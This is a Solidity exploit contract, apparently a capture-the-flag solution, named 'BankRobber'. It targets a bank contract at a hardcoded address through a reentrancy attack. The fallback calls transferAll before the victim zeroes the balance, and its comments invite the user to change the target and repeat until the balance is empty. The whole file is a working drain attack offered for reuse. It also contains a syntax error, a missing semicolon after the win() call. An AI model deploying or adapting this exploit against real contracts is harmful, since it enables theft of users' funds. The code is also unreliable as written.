// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.0;

interface IBank {
    function addToBalance() payable  external;
    function withdrawBalance(uint amount) external;
    function transferAll(address to) external;
    function win() external;
}

contract BankRobber {
    // change to your target
    address target = 0x0fC5025C764cE34df352757e82f7B5c4Df39A836;
    IBank bankContract = IBank(target);

    // deposits msg.value only to withdraw it once
    function rob(uint _loot) external payable {
        address(bankContract).call{value: msg.value}(
            abi.encodeWithSignature("addToBalance()")
        );
        bankContract.withdrawBalance(_loot);
    }
    receive() payable external{}

    /* upon withdrawal, the fallback is called and transfers
    all your balance from rob() to yourself before your balance
    is updated to zero essentially giving you double what you put
    in */
    fallback() payable external {
        bankContract.transferAll(address(this));
    }

    function addressBalance() external view returns(uint) {
        return address(this).balance;
    }

    /* withdraw your bonus from tricking the contract.
    Rinse and repeat til the balance is zero. */
    function makeMeRicher(uint _loot) external {
        bankContract.withdrawBalance(_loot);
    }

    function winnersCircle() external {
        bankContract.win()
    }
}
